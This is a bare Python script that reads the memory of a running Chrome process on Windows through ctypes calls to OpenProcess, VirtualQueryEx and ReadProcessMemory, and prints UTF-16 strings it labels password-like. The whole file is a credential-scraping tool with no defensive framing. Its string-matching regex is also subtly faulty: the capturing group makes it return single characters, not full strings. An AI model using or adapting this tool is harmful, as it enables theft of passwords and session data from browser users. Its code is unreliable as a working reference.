import ctypes
import psutil
import re

# Windows constants
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [("BaseAddress", ctypes.c_void_p),
                ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", ctypes.c_ulong),
                ("RegionSize", ctypes.c_size_t),
                ("State", ctypes.c_ulong),
                ("Protect", ctypes.c_ulong),
                ("Type", ctypes.c_ulong)]

# Get Chrome PID
def get_chrome_pid():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome.exe' in proc.info['name'].lower():
            return proc.pid
    return None

# Open process with read permission
def open_process(pid):
    PROCESS_ALL_ACCESS = 0x1F0FFF
    return ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)

# Enumerate memory regions with VirtualQueryEx
def enum_memory_regions(process_handle):
    address = 0
    mem_info = MEMORY_BASIC_INFORMATION()
    while ctypes.windll.kernel32.VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mem_info), ctypes.sizeof(mem_info)):
        if mem_info.State == MEM_COMMIT and mem_info.Protect == PAGE_READWRITE:
            yield (mem_info.BaseAddress, mem_info.RegionSize)
        address += mem_info.RegionSize

# Read memory chunk
def read_memory(process_handle, base_address, size):
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t(0)
    if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_address), buffer, size, ctypes.byref(bytes_read)):
        return buffer.raw[:bytes_read.value]
    return None

# Search for UTF-16 strings matching password-like patterns
def find_utf16_strings(data):
    pattern = re.compile(b'([\x20-\x7E][\x00]){6,20}')  # basic UTF-16 LE printable strings 6-20 chars
    return pattern.findall(data)

def main():
    pid = get_chrome_pid()
    if not pid:
        print("Chrome process not found.")
        return

    print(f"Found Chrome PID: {pid}")

    process_handle = open_process(pid)
    if not process_handle:
        print("Failed to open process. Try running as admin.")
        return

    for base_addr, region_size in enum_memory_regions(process_handle):
        data = read_memory(process_handle, base_addr, region_size)
        if data:
            strings = find_utf16_strings(data)
            for s in strings:
                try:
                    print(s.decode('utf-16le'))
                except:
                    pass

    ctypes.windll.kernel32.CloseHandle(process_handle)

if __name__ == "__main__":
    main()
